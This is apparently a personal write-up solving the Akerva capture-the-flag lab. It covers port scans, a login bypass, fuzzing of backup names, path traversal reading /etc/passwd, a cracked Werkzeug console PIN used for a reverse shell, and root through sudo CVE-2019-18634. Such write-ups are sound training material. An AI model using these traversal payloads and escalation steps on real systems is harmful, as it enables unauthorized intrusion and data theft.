# Akerva
#fortress

### Description: 
    This fun fortress from Akerva features a gradual learning curve. It teaches about common developer mistakes while also introducing a very interesting web vector. Prepare to take your skills to the next level!

### Entry point: 
    10.13.37.11    
### Flags   : `8`
### Points : `95`
---
## **Plain Sight**

You have to download a separate vpn pack to connect to the Fortress labs. You can get it from the access page.

After firing up the vpn you can visit the entry point from a browser and you'll find the first flag which is plain sight.

![[Pasted image 20210715140205.png]]

You can go ahead and submit this flag and it'll update your progress.   

## Take a look around

Let's run an nmap scan

```bash
nmap -sC -sV -A -T4 -p- 10.13.37.11 --open
```

![[Pasted image 20210715154030.png]]

We can see a http service on port 5000 which prompted a login, I tried to bruteforce it with common passwords but nothing came out of it.

A normal nmap scan only scans for tcp ports. Let's run an udp port scan too.

```bash
nmap -sC -sV -sU -A -T4 10.13.37.11 --open
```

![[Pasted image 20210715211741.png]]
We find an snmp server, let's fire up metasploit for snmp enum scan.

The scan returns system info and processes where we find one of the flag in the processes 
![[Pasted image 20210715213847.png]]

## Dead Poets

Let's check for the file where we found the $2^{nd}$  flag. The URL prompts a http login authentication let's check once using burpsuite. It's requesting login using `GET` sometimes you can bypass it by just changing it to `POST`.

Just edit the request in Burpsuite.

We Bypass the login and find the script along with the flag.

```bash
#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{#3}
#

SAVE_DIR=/var/www/html/backups

while true
do
	ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
	echo "Erasing old backups..."
	rm -rf $SAVE_DIR/*

	echo "Backuping..."
	zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

	echo "Done..."
	sleep 1020
done
```

## Now You See Me

The backups are being refreshed every 17 minutes meaning the name changes every time.

The name format is `/backup_YYYYMMDDHHmmss.zip`. We can find the time on the machine by just curling to it i.e.
```bash
curl -i "https://10.13.37.11"
```

We can use wfuzz to fuzz the remaining 4 numbers.

```bash
wfuzz -u "http://10.13.37.11/backups/backup_2021071610FUZZ.zip" -z range,0000-9999 --hc 404
```

`0913` was the return result. I tried to download it from browser but it was showing Unauthorized access.
So just wget it 

```bash
wget http://10.13.37.11/backups/backup_20210716100913.zip
```
![[Pasted image 20210716154013.png]]

There were many common files but the dev directory looked interesting. It had a python script  which contained the 4th flag.

## Open Book

We can test the creds found in the python script for `5000` port.

The login worked but there's nothing much interesting. So let's directory bust.
Wfuzz looks interesting so let's try using wfuzz.

```bash
wfuzz -u "http://10.13.37.11:5000/FUZZ" -w /usr/share/wordlists/dirb/common.txt --hc 404
```

![[Pasted image 20210716163947.png]]

`console` was protected by PIN and  `download` had some python errors and one of them had an error from `line 29` in the previous script we found 

```python
#!/usr/bin/python  
  
from flask import Flask, request  
from flask_httpauth import HTTPBasicAuth  
from werkzeug.security import generate_password_hash, check_password_hash  
  
app = Flask(__name__)  
auth = HTTPBasicAuth()  
  
users = {  
       "aas": generate_password_hash("AKERVA{#4}")  
       }  
  
@auth.verify_password  
def verify_password(username, password):  
   if username in users:  
       return check_password_hash(users.get(username), password)  
   return False  
  
@app.route('/')  
@auth.login_required  
def hello_world():  
   return 'Hello, World!'  
  
# TODO  
@app.route('/download')  
@auth.login_required  
def download():  
   return downloaded_file  
  
@app.route("/file")  
@auth.login_required  
def file():  
       filename = request.args.get('filename')  
       try:  
               with open(filename, 'r') as f:  
                       return f.read()  
       except:  
               return 'error'  
  
if __name__ == '__main__':  
   print(app)  
   print(getattr(app, '__name__', getattr(app.__class__, '__name__')))  
   app.run(host='0.0.0.0', port='5000', debug = True)
```

The function at line 29 navigates to `/file` in URL and `GET` a filename parameter.

I tried a LFD (Local File Disclosure) on it and it worked 

```
http://10.13.37.11:5000/file?filename=../../../../../../../etc/passwd
```

and we also know one of the user directory `aas` from before, so we try our luck with `flag.txt` in that directory.

```
http://10.13.37.11:5000/file?filename=../../../../../../../home/aas/flag.txt
```

## Say Friend and Enter

Let's try to find the ssh-key so we can ssh onto the machine but it was showing as error.

Going back to other directories we found i.e. `/console` it's a python interactive console pin. Googling about it we find it on [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug) which was for sure going to work.

You have to go through the instructions and modify the script accordingly.

We can find the machine-id and mac address from the LFI.

We have to input the decimal representation of the mac address in the script
00:50:56:b9:1c:5e ➡️ 0x005056b91c5e

```python
>>> print(0x005056b91c5e)   
345052355678  
```

You have to see if the console was using python2 or python3 and depending on that you have to make some changes to the script.

As we have a python shell just make a reverse-shell script.

There's a firefox add-on called Hack-Tools which you can use to easily generate shells or you can always use PayloadsAllThings.

As this is a python console you don't need to add the `python -c` and input only the code

We can find the flag in the hidden file.

## Super Mushroom

As always first check the sudo version then sudo permission s and then crontabs.

```bash
sudo --version
```

Searching for the sudo version we can find different exploits. 
For this version we find [ CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

Execute the C file and send the bin file to the target so you can execute it over there.

Host a Python server in the bin file directory
```bash
python -m SimpleHTTPServer 80
```

Use wget on the target to retrieve it 

```bash
wget http://10.13.14.21/sudo
```

Sometimes you can't download or execute in home directories so move to `/tmp`.

Executing the binary we become root and find the flag in the `/root` directory

## Little Secret

We find another note in the directory

```
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK  
  
@AKERVA_FR | @lydericlefebvre
```

The text looks like it's a base64.
 After decoding it we get 
 ``` 
 GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
 ```
 
 My guess the from the heading in HTB is its a vignere bcoz it said a secret and i though maybe a secret key.
 
 We for sure know that AKERVA will be in the decoded string and looking at the string more carefully some alphabets are not there in it. So the alphabet string is changed.
 
 Use dcode to decrypt it and put AKERVA in known string column.
  
  Looking at the results the key is `ILOVESPACE` let's decrypt it using that because the results are not that clear.
  
  ```
WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE
  ```